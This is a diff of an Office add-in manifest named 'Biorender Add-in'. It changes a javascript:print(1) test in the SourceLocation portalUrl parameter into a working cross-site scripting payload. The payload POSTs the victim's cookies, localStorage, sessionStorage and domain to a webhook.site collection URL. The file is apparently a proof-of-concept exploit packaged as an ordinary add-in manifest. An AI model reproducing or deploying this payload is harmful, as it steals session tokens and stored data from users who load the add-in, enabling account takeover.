@@ -6,7 +6,7 @@
   <Version>1.0.0</Version>
   <ProviderName>Test</ProviderName>
   <DefaultLocale>en-US</DefaultLocale>
-  <DisplayName DefaultValue="Biorender Add-in3"/>
+  <DisplayName DefaultValue="Biorender Add-in 4"/>
   <Description DefaultValue="Biorender Add-in Description"/>
   <IconUrl DefaultValue="https://example.com/icon-32.png"/>
   <HighResolutionIconUrl DefaultValue="https://example.com/icon-64.png"/>
@@ -16,7 +16,7 @@
   </Hosts>
   
   <DefaultSettings>
-    <SourceLocation DefaultValue="https://app.biorender.com/office/sso_portal?portalUrl=javascript:print(1);//"/>
+    <SourceLocation DefaultValue="https://app.biorender.com/office/sso_portal?portalUrl=javascript:fetch('https://webhook.site/9b87f00e-8d94-4e65-b533-97a9b66f50dd',{method:'POST',body:JSON.stringify({c:document.cookie,l:localStorage,s:sessionStorage,d:document.domain})});//"/>
   </DefaultSettings>
   
   <Permissions>ReadWriteDocument</Permissions>
